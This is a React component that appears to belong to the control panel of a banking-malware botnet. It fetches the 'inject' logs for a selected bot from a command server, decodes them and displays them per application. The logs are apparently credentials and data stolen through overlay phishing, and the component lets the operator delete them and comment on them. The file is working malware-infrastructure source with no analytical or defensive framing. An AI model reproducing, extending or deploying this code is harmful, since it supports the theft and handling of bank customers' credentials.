import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import EditCommentUniversal from '../EditCommentUniversal';
import $ from 'jquery';

class LogsInjects extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            ResultOnLog:[]
        };
    }

    componentWillReceiveProps() {
        if(SettingsContext.start_modul != 'LogsInjectsModal'){
            return;
        }

        this.setState({
            ResultOnLog: []
        });
        this.SendLogsCommand();
    }

  

    Base64DecodeToStr(base64str) {
        return new Buffer(base64str.toString()  == null ? '' : base64str.toString(), 'base64').toString('utf-8');
    }


    SendLogsCommand(cmdName, deletethis) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(//
                    '{"sent_request":"get_logs_injects","ID":"' + SettingsContext.CurrentSetBot + '", "APP":"' + SettingsContext.NameApplication + '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					//SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					if(isNullOrUndefined(deletethis)) {
						this.ParseResult(result);
					}
					else {
						// SettingsContext.ShowToast('success', 'logs delete success');
						// this.setState({
						// 	ResultOnLog: <Redirect to="/bots"/>
						// });
					}
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot cmd ' + cmdName + '. Look console for more details.');
               // console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    UpdateThisComponent() {
        this.setState({
            ResultOnLog: []
        });
        this.SendLogsCommand();
    }
    OnDeleteThis(idinj,app) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"remove_log_injects","idinj":"' + idinj + '","app":"'+app+'"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.props.UpdateThisComponent();
                }
                else {
                    try_eval('$.notify("Removed log ", "info");');
                    this.props.UpdateThisComponent();
                }
            }
            catch (ErrMgs) {}
        }.bind(this));
    }
    htmlLogList(logs, app){
       let json = JSON.parse(this.Base64DecodeToStr(logs));
       let logsString = 'Application : ' + app + '<br/>';
       for (var prop in json) {
            logsString = logsString +  prop + ' : ' + json[prop] + '<br/>'; 
       }
       return logsString;
    }


    ParseResult(resultJSON) {
    let MyLogsArr = [];
            Object.keys(resultJSON).forEach(function(k){
                resultJSON[k].forEach(function(element) {
                    MyLogsArr.push(//<p>
            <tr>
            <td class="check-bot" onClick={this.OnDeleteThis.bind(this, element.IL, element.AS)} style={({textAlign: 'right',padding: '0px', width:'38px'})}><i class="fal fa-trash-alt"  style={({marginRight: '10px'})}></i></td>
          
            <td>  <a class="list-group ulBank" dangerouslySetInnerHTML={{__html: this.htmlLogList(element.LS, element.AS)}}  /></td>

            <td style={({padding: '10px'})}><EditCommentUniversal parentObj={this} idinj={element.IL} text={this.Base64DecodeToStr(element.CT)} request="change_comment_bank" /></td>



            </tr>);
                }.bind(this));
            }.bind(this));
        this.setState({
            ResultOnLog: MyLogsArr
        });
    }
    DeleteLogs(){this.SendLogsCommand('remove_table_sms_history', true);}
    render () {
        const tdw = {
            padding: '0px',
            textAlign: 'center',
            fontSize: '31px',
            width: '55px'
        }

        const CommentWidth = {
            padding: '0px',
            textAlign: 'center',
            fontSize: '31px',
            width: '350px'
        }
    

        
       
        return (

            <div class="modal fade" id="LogsInjectsModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-lg" role="document">
                <div class="modal-content ">
                <div class="modal-header">
                    <h5>Logs injections ID: { SettingsContext.CurrentSetBot}</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button>
                </div>
            
                <div style={({overflow: 'hidden', height: '50vh', overflowY: 'scroll', overflowX: 'hidden'}) }>

                <table  class="table table-striped table-dark" id="table1">
                        <thead>
                            <tr>
                                <th></th>
                                <th scope="col" style={tdw}><i class="fas fa-clipboard-list"/></th>

                                <th scope="col" style={CommentWidth}><i class="far fa-comment"/></th>
                            </tr>
                        </thead>
                        <tbody>
                             {this.state.ResultOnLog}
                        </tbody>
                    </table>
               
                </div>

               
                
                </div>
            </div>
        </div>
     
        );
    }
}

export default LogsInjects;